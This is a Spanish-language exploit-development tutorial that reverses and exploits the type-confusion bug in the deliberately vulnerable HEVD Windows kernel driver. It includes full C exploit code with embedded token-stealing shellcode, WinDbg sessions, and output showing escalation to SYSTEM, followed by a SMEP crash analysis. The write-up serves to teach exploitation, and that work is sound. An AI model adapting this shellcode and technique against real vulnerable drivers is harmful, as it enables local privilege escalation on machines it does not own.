<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>HEVD: Type Confusion</title>

  <meta name="description" content="Explotación de Type Confusion en modo kernel">
  <meta name="author" content="DarthBear">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HEVD: Type Confusion">
  <meta name="twitter:description" content="Explotación de Type Confusion en modo kernel">
  <meta name="twitter:creator" content="DarthBear">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/type-confusion/image.png" />

  <meta property="og:site_name" content="DarthBear" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="HEVD: Type Confusion">
  <meta property="og:description" content="Explotación de Type Confusion en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/type-confusion/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/type-confusion/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="HEVD: Type Confusion" href="/feed.xml">
</head>

  <body style="background-color: #282828;">

    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="DarthBear">
          <h1 class="panel-cover__title panel-title scale-up-center">DarthBear</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="DarthBear" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">

              <li class="navigation__item grow">
                <a href="https://github.com/kevincillo32" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://x.com/Bear00652327128" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/kevinch1106" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://www.youtube.com/@darthbear3654" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:kevincillo32@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#reversing">Reversing</a></li>
        <li><a href="#crashing">Crashing</a></li>
        <li><a href="#exploit">Exploit</a></li>
        <li><a href="#smep">SMEP</a></li>
        <li><a href="#pivot">Stack Pivot</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/type-confusion/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">HEVD: Type Confusion</h2><br>
  </header>

<p class="plain-text">En este post se llevara a cabo la explotación de otra de las vulnerabilidades del driver <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>, en este caso un Type Confusion en modo kernel y aunque parece ser bastante sencillo al explotar la vulnerabilidad nos encontraremos con algunos problemas</p>

<section class="post" id="reversing">
<br><h3 class="post-title">Reversing</h3><br>    

<p class="plain-text">En este caso partiremos el código ioctl <code class="language-plaintext highlighter-rouge">0x222023</code> que nos interesa explotar, para ver como llegar hasta aquí se puede consultar la parte de reversing en el <a href="/exploit-development/windows-kernel/stack-overflow/#reversing">post</a> anterior</p>
<a href="/exploit-development/windows-kernel/type-confusion/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/1.png"></p></div></a>

<p class="plain-text">Siguiendo la flecha verde podemos ver que es el bloque encargado de llamar a una función con el nombre <code class="language-plaintext highlighter-rouge">TypeConfusionIoctlHandler</code> que tiene la vulnerabilidad</p>
<a href="/exploit-development/windows-kernel/type-confusion/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/2.png"></p></div></a>

<p class="plain-text">Esta función se encarga de llamar a <code class="language-plaintext highlighter-rouge">TriggerTypeConfusion</code> pasandole como argumento una estructura <code class="language-plaintext highlighter-rouge">UserTypeConfusionObject</code> que recibe como entrada</p>
<a href="/exploit-development/windows-kernel/type-confusion/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/3.png"></p></div></a>

<p class="plain-text">La estructura que recibe como parámetro podemos verla desde <code class="language-plaintext highlighter-rouge">WinDbg</code>, ésta cuenta de solo 2 atributos cada uno de <code class="language-plaintext highlighter-rouge">8</code> bytes, estos se llaman <code class="language-plaintext highlighter-rouge">OnjectID</code> y <code class="language-plaintext highlighter-rouge">ObjectType</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dt HEVD!_USER_TYPE_CONFUSION_OBJECT  
   +0x000 ObjectID         : Uint8B
   +0x008 ObjectType       : Uint8B</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">TriggerTypeConfusion</code> inicia guardando la dirección a la estructura inicial en <code class="language-plaintext highlighter-rouge">rbx</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">ProbeForRead</code> para verificar la accesibilidad y después a <code class="language-plaintext highlighter-rouge">ExAllocatePoolWithTag</code> para poder asignar un <code class="language-plaintext highlighter-rouge">chunk</code> del tamaño de la estructura, <code class="language-plaintext highlighter-rouge">16</code> bytes en la memoria del tipo <code class="language-plaintext highlighter-rouge">NonPagedPool</code> del kernel, el resultado que es el puntero al bloque lo guarda en <code class="language-plaintext highlighter-rouge">r14</code> que será una estructura de <code class="language-plaintext highlighter-rouge">16</code> bytes como la anterior</p>
<a href="/exploit-development/windows-kernel/type-confusion/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/4.png"></p></div></a>

<p class="plain-text">El siguiente bloque llama varias veces a <code class="language-plaintext highlighter-rouge">DbgPrintEx</code> para mostrar información como el tipo de <code class="language-plaintext highlighter-rouge">pool</code>, el tamaño del <code class="language-plaintext highlighter-rouge">chunk</code> y su puntero, además los punteros a la estructura inicial <code class="language-plaintext highlighter-rouge">UserTypeConfusionObject</code> recibida y la <code class="language-plaintext highlighter-rouge">KernelTypeConfusionObject</code> que se creó en el pool anteriormente, tambíen muestra el tamaño de esta estructura</p>
<a href="/exploit-development/windows-kernel/type-confusion/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/5.png"></p></div></a>

<p class="plain-text">También podemos ver la estructura <code class="language-plaintext highlighter-rouge">KernelTypeConfusionObject</code> en <code class="language-plaintext highlighter-rouge">WinDbg</code>, esta consta de <code class="language-plaintext highlighter-rouge">3</code> atributos, el primero es <code class="language-plaintext highlighter-rouge">ObjectID</code> que ocupa los primeros <code class="language-plaintext highlighter-rouge">8</code> bytes y luego <code class="language-plaintext highlighter-rouge">ObjectType</code> y <code class="language-plaintext highlighter-rouge">Callback</code> que comparten el mismo offset y por lo tanto valor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt HEVD!_KERNEL_TYPE_CONFUSION_OBJECT
   +0x000 ObjectID         : Uint8B
   +0x008 ObjectType       : Uint8B
   +0x008 Callback         : Ptr64     void  </span>
</code></pre></div></div><br>

<p class="plain-text">Más adelante guarda los valores de la estructura inicial en <code class="language-plaintext highlighter-rouge">rbx</code> a la creada en <code class="language-plaintext highlighter-rouge">r14</code>, luego le pasa la estructura en <code class="language-plaintext highlighter-rouge">r14</code> a la función <code class="language-plaintext highlighter-rouge">TypeConfusionObjectInitializer</code></p>
<a href="/exploit-development/windows-kernel/type-confusion/6.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/6.png"></p></div></a>

<p class="plain-text">Al iniciar la función en <code class="language-plaintext highlighter-rouge">rcx</code> se almacena el puntero a la estructura, luego muestra con <code class="language-plaintext highlighter-rouge">DbgPrintEx</code> el puntero al <code class="language-plaintext highlighter-rouge">Callback</code> que obtiene de <code class="language-plaintext highlighter-rouge">[rcx + 8]</code>, luego mueve a <code class="language-plaintext highlighter-rouge">rbx</code> el valor de <code class="language-plaintext highlighter-rouge">rcx</code> y llama a <code class="language-plaintext highlighter-rouge">[rbx + 8]</code> donde se encuentra el <code class="language-plaintext highlighter-rouge">Callback</code> que tiene el mismo valor del <code class="language-plaintext highlighter-rouge">ObjectType</code>, por lo que si controlamos su valor también la llamada</p>
<a href="/exploit-development/windows-kernel/type-confusion/8.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/8.png"></p></div></a>

</section>
<section class="post" id="crashing">
<br><h3 class="post-title">Crashing</h3><br>

<p class="plain-text">Utilizando <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> podemos comunicarnos pasandole el handle y el código <code class="language-plaintext highlighter-rouge">ioctl</code> perteneciente a la función, además de ello el <code class="language-plaintext highlighter-rouge">buffer</code> que le pasaremos y su tamaño, el resto de parámetros los dejaremos como <code class="language-plaintext highlighter-rouge">NULL</code> ya que no nos interesan</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">BOOL </span><span class="na">DeviceIoControl</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">HANDLE</span><span class="p">       hDevice,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        dwIoControlCode,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPVOID</span><span class="p">       lpInBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nInBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPVOID</span><span class="p">       lpOutBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nOutBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPDWORD</span><span class="p">      lpBytesReturned,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">out</span><span class="p">,</span><span class="mi"> optional</span><span class="p">] </span><span class="no">LPOVERLAPPED</span><span class="p"> lpOverlapped
);</span>
</code></pre></div></div><br>

<p class="plain-text">En un proyecto de <code class="language-plaintext highlighter-rouge">Visual Studio</code> definimos el siguiente código, iniciamos definiendo la estructura <code class="language-plaintext highlighter-rouge">UserObject</code> con 2 valores, luego creamos una instancia de este y al primer valor le damos un <code class="language-plaintext highlighter-rouge">qword</code> del byte <code class="language-plaintext highlighter-rouge">0x41</code> y al segundo de <code class="language-plaintext highlighter-rouge">0x42</code>, luego la hacer la llamada <code class="language-plaintext highlighter-rouge">ioctl</code> le pasamos como parámetro la referencia a esta instancia</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>

</span><span class="no">typedef struct</span><span class="p"> {
    </span><span class="na">ULONG_PTR</span><span class="p"> objectID;
    </span><span class="na">ULONG_PTR</span><span class="p"> objectType;
} </span><span class="na">UserObject</span><span class="p">;

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    UserObject payload </span><span class="o">=</span><span class="p"> {
        </span><span class="mi">0x4141414141414141</span><span class="p">,
        </span><span class="mi">0x4242424242424242</span><span class="p">
    };

    </span><span class="na">HANDLE</span><span class="p"> handle</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222023</span><span class="p">,</span><span class="o"> &</span><span class="p">payload,</span><span class="o"> sizeof</span><span class="p">(payload),</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para ver lo que está haciendo el ultimo bloque reverseado estableceremos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la función <code class="language-plaintext highlighter-rouge">TypeConfusionObjectInitializer</code> y continuaremos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp HEVD!TypeConfusionObjectInitializer  

</span><span class="ro">0: kd> </span><span class="p">g</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de compilar el proyecto nuestro exploit nos queda en un <code class="language-plaintext highlighter-rouge">.exe</code> que ejecutamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe  </span>
</code></pre></div></div><br>

<p class="plain-text">Volviendo al debugger podemos ver que en el kernel hemos alcanzado el <code class="language-plaintext highlighter-rouge">breakpoint</code> a la función, podemos los valores de la estructura <code class="language-plaintext highlighter-rouge">KernelTypeConfusionObject</code> actual donde <code class="language-plaintext highlighter-rouge">ObjectType</code> y el <code class="language-plaintext highlighter-rouge">Callback</code> apuntan al segundo valor que enviamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
HEVD!TypeConfusionObjectInitializer:
fffff806`59b87514 4053            push    rbx

</span><span class="ro">0: kd></span><span class="p"> dt HEVD!_KERNEL_TYPE_CONFUSION_OBJECT @rcx
   +0x000 ObjectID         : 0x41414141`41414141
   +0x008 ObjectType       : 0x42424242`42424242
   +0x008 Callback         : 0x42424242`42424242     void  +4242424242424242  </span>
</code></pre></div></div><br>

<p class="plain-text">Si avanzamos a la llamada a <code class="language-plaintext highlighter-rouge">Callback</code> podemos ver que apuntará a la dirección <code class="language-plaintext highlighter-rouge">0x4242424242424242</code> por lo que obtenemos el control del flujo del programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> pc 3
HEVD!TypeConfusionObjectInitializer+0x1c:
fffff806`59b87530 ff15d2aaf7ff    call    qword ptr [HEVD!_imp_DbgPrintEx (fffff806`59b02008)]  
HEVD!TypeConfusionObjectInitializer+0x31:
fffff806`59b87545 ff15bdaaf7ff    call    qword ptr [HEVD!_imp_DbgPrintEx (fffff806`59b02008)]  
HEVD!TypeConfusionObjectInitializer+0x37:
fffff806`59b8754b ff5308          call    qword ptr [rbx+8]

</span><span class="ro">0: kd></span><span class="p"> dqs rbx + 8 L1
ffffde0b`7e302be8  42424242`42424242</span>
</code></pre></div></div><br>

</section>
<section class="post" id="exploit">
<br><h3 class="post-title">Exploit</h3><br>

<p class="plain-text">Finalmente solo nos queda reservar un espacio un memoria para un <code class="language-plaintext highlighter-rouge">shellcode</code>, utilizaremos un <a href="https://github.com/kevincillo32/ExploitDevelopment/blob/main/shellcode/token_stealing.asm">token stealing</a>, este shellcode esta diseñado para tomar el token del proceso <code class="language-plaintext highlighter-rouge">SYSTEM</code> y copiarlo a nuestro proceso actual por lo que deberiamos obtener sus privilegios, en el <code class="language-plaintext highlighter-rouge">Callback</code> apuntaremos a la dirección del shellcode por lo que deberia ejecutarse, una vez interpretado simplemente ejecutaremos una <code class="language-plaintext highlighter-rouge">cmd.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>

</span><span class="na">BYTE </span><span class="p">token_stealing[</span><span class="mi">120</span><span class="p">] </span><span class="o">=</span><span class="p"> {</span><span class="mi">
    0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi">
    0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0xc3</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi">
    0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi">
    0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07
</span><span class="p">};

</span><span class="no">typedef struct</span><span class="p"> {
    </span><span class="na">ULONG_PTR</span><span class="p"> objectID;
    </span><span class="na">ULONG_PTR</span><span class="p"> objectType;
} </span><span class="na">UserObject</span><span class="p">;

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(token_stealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode, token_stealing,</span><span class="o"> sizeof</span><span class="p">(token_stealing));

    UserObject payload</span><span class="o"> =</span><span class="p"> {
        </span><span class="mi">0x4141414141414141</span><span class="p">,
        (</span><span class="na">ULONG_PTR</span><span class="p">) shellcode
    };

    </span><span class="na">HANDLE</span><span class="p"> handle</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222023</span><span class="p">,</span><span class="o"> &</span><span class="p">payload,</span><span class="o"> sizeof</span><span class="p">(payload),</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos comprobar su funcionamiento al ejecutarlo, al llamar a <code class="language-plaintext highlighter-rouge">[rbx + 8]</code> que es el callback ahora apunta a la dirección donde se encuentra nuestro shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp HEVD!TypeConfusionObjectInitializer + 0x37

</span><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
HEVD!TypeConfusionObjectInitializer+0x37:
fffff806`59b8754b ff5308          call    qword ptr [rbx+8]

</span><span class="ro">0: kd></span><span class="p"> u poi(rbx + 8) L1
000002a2`133e0000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit deberiamos pasar del usuario llamado <code class="language-plaintext highlighter-rouge">user</code> con bajos privilegios a <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con máximos privilegios sobre el equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="smep">
<br><h3 class="post-title">SMEP</h3><br>

<p class="plain-text">El exploit anterior funciona bien sin embargo aún hay algo a tener en cuenta, este corria con la protección <code class="language-plaintext highlighter-rouge">SMEP</code> deshabilitada temporalmente sin embargo a partir de <code class="language-plaintext highlighter-rouge">Windows 8</code> todos los windows actuales lo tienen activado por defecto, entonces veamos que pasa ahora si ejecutamos el exploit, al ejecutar el <code class="language-plaintext highlighter-rouge">call</code> e intentar interpretar la primera instrucción del shellcode nos lanza un <code class="language-plaintext highlighter-rouge">BSOD</code> y este muestra el error <a href="https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xfc---attempted-execute-of-noexecute-memory">ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</a> y no podemos ejecutarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
HEVD!TypeConfusionObjectInitializer+0x37:
fffff806`59b8754b ff5308          call    qword ptr [rbx+8]

</span><span class="ro">0: kd></span><span class="p"> t
000002a2`133e0000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> p
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x000000fc (0x000002A2133E0000,0x00000000927BD867,0xFFFFC48D2A526F40,0x0000000080000005)  

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff806`51a077a0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
An attempt was made to execute non-executable memory.  The guilty driver
is on the stack trace (and is typically the current instruction pointer).
When possible, the guilty driver's name is printed on
the BugCheck screen and saved in KiBugCheckDriver.
Arguments:
Arg1: 000002a2133e0000, Virtual address for the attempted execute.
Arg2: 00000000927bd867, PTE contents.
Arg3: ffffc48d2a526f40, (reserved)
Arg4: 0000000080000005, (reserved)</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/type-confusion/9.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/type-confusion/9.png"></p></div></a>

